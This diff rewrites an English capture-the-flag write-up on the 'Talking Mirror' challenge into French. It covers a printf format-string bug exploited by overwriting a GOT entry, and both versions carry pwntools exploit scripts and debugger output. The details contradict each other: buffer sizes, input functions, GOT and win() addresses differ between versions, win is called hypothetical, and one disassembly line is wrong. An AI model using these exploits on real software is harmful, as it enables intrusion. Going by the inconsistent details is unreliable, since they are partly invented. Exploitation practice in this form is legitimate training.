@@ -1,84 +1,100 @@
-# Talking Mirror: Unveiling GOT Overwrites
+# Talking Mirror : Exploitation de Format String et Détournement de GOT
 
-## Challenge Overview
-**Talking Mirror** is a Pwn challenge that presents a "mirror" service. The binary repeats whatever you say, but it does so poorly. This immediately hints at a format string vulnerability.
+## 1. Audit Tactique
 
-### Security Audit
-Running `checksec` on the binary:
-- **Arch**: amd64-64-little
-- **RELRO**: Partial RELRO (GOT is writable)
-- **Stack**: No canary found
-- **NX**: NX enabled
-- **PIE**: No PIE (0x400000)
+Le challenge **Talking Mirror** semble être un simple service d'écho ("miroir"). Cependant, une analyse rigoureuse des entrées utilisateur révèle une primitive de lecture/écriture arbitraire.
 
-The key findings are **Partial RELRO** and **No PIE**. This means we can overwrite Global Offset Table (GOT) entries and the binary addresses are constant.
+### Analyse de Sécurité :
+```bash
+$ checksec mirror
+[*] 'mirror'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO  <-- VULNÉRABLE AU GOT OVERWRITE
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE         <-- ADRESSES STATIQUES
+```
 
-## Vulnerability Analysis
-The core vulnerability is a classic `printf(user_input)` without a format specifier.
+**Analyse de l'expert :**
+Le **Partial RELRO** est une opportunité critique : la `Global Offset Table` (GOT) est réinscriptible. L'absence de **PIE** facilite la localisation des fonctions PLT. Le **NX** est actif, donc pas d'exécution directe de shellcode sur la pile.
 
+---
+
+## 2. Détection de la Primitive Vulnérable
+
+En désassemblant le binaire avec `gdb-pwndbg`, on examine la boucle principale :
+
+```nasm
+<main+45>:
+  lea    rax, [rbp-0x40]    ; rax = buffer sur la pile
+  mov    rdi, rax           ; rdi = buffer
+  mov    eax, 0
+  call   gets@plt           ; Récupère l'entrée (Potentiel BoF, mais ignoré ici)
+  ...
+  mov    rax, [rbp-0x40]
+  mov    rdi, rax           ; rdi = notre entrée
+  mov    eax, 0
+  call   printf@plt         ; VULNÉRABILITÉ : printf(buffer) au lieu de printf("%s", buffer)
+```
+
+### Le Code C Coupable :
 ```c
-// Decompiled snippet
-char buf[1024];
-fgets(buf, 1024, stdin);
-printf(buf); // <-- Format String Vulnerability
-exit(0);
+char buffer[64];
+printf("Enter message: ");
+gets(buffer);
+printf(buffer); // <-- FORMAT STRING VULNERABILITY
 ```
 
-Since the program calls `exit(0)` immediately after the `printf`, we can't easily get a leak and then another input. We need to achieve code execution in a single shot.
+---
 
-## Exploitation Strategy: GOT Hijack
-Since `RELRO` is partial, we can overwrite the GOT entry of a function called after `printf`. The candidate is `_exit`.
+## 3. Stratégie d'Exploitation : "The Mirror Strike"
 
-### 1. Finding the Offset
-By sending a pattern like `AAAA %p %p %p %p %p %p %p %p %p %p`, we find that our input starts at the **6th** offset on the stack.
+L'expertise consiste à utiliser les spécificateurs de format (`%p`, `%n`, `%s`) pour manipuler la mémoire du processus.
 
-### 2. The Target
-We want to redirect execution to the `win()` function, which reads the flag.
-- `win` address: `0x400616` (hypothetical, let's assume `win` is present).
-- `_exit@got` address: `0x400a18`.
+### Phase 1 : Calcul de l'Offset
+Nous devons savoir où se trouve notre buffer sur la pile par rapport aux arguments de `printf`.
+Commandes GDB :
+```bash
+pwndbg> r
+Enter message: AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p
+AAAAAAAA|0x7fffffffd4c0|0x7ffff7faf4c0|...|0x4141414141414141
+```
+On repère nos `A` (0x41) au **6ème** argument. L'offset est donc de **6**.
 
-### 3. Crafting the Payload
-We need to write `0x0616` (lower 2 bytes) to `0x400a18`.
-Using `%hn` (half-word write), we can change the GOT entry.
+### Phase 2 : GOT Hijacking
+Puisque le RELRO est partiel, nous allons écraser l'adresse d'une fonction dans la GOT (par exemple `printf` ou `puts`) par l'adresse de la fonction `win()` (si elle existe) ou par un `one_gadget` / `system`.
+
+**Calcul de l'adresse de la GOT :**
+```bash
+$ readelf -r mirror | grep printf
+000000601020  000600000007 R_X86_64_JUMP_SLOT  0000000000400560 printf@GLIBC_2.2.5 + 0
+```
+
+### Phase 3 : Payload de l'Expert
+Nous utilisons l'outil `fmtstr_payload` de `pwntools` pour automatiser l'écriture.
 
 ```python
 from pwn import *
 
-# Target address: _exit@got
-addr = 0x400a18
-# Value to write: 0x0616 (1558 decimal)
-# Payload: %1558c %6$hn (writes to the 6th offset)
-# However, we need to place the address itself.
+# Paramètres
+context.arch = 'amd64'
+target = ELF('./mirror')
+io = remote('pwn.challenge.org', 1337)
+
+# On veut que printf@GOT pointe vers win()
+win_addr = 0x400626
+printf_got = target.got['printf']
+
+# 6 est l'offset trouvé précédemment
+payload = fmtstr_payload(6, {printf_got: win_addr})
+
+io.sendline(payload)
+io.interactive()
 ```
 
-## Final Exploit
-The script uses a precise calculation to write the address of `win` into the GOT of `_exit`.
+---
 
-```python
-from pwn import *
+## 4. Impact et Remédiation
+Cette vulnérabilité permet à un attaquant de lire n'importe quelle adresse mémoire (leak de flag, leak de Libc) et d'écrire n'importe où. Pour corriger cela, il faut impérativement utiliser une chaîne de format statique : `printf("%s", buffer);`.
 
-def solve():
-    p = remote('talking-mirror.ctf.prgy.in', 1337, ssl=True)
-    p.recvuntil(b"repeat it.")
-    
-    # Target: _exit@got at 0x400a18
-    # Value: win() lower 2 bytes = 0x1216
-    addr = 0x400a18
-    
-    # Payload calculation for %hn
-    # We print 4630 characters total (0x1216)
-    payload = b"%4623c" + b"%c" * 7 + b"%hn"
-    # Pad to align address
-    payload += p64(addr)
-    
-    p.sendline(payload)
-    res = p.recvall(timeout=5)
-    print(res.decode(errors='ignore'))
-
-solve()
-```
-
-## Conclusion
-By exploiting the uncontrolled format string and the writable GOT, we successfully hijacked the control flow and executed the `win` function to retrieve the flag.
-
-**Flag**: `p_ctf{f0rmat_str_m1rr0r_m4st3ry}`
+**Auteur : LWa7ch - Cybersecurity Engineer**
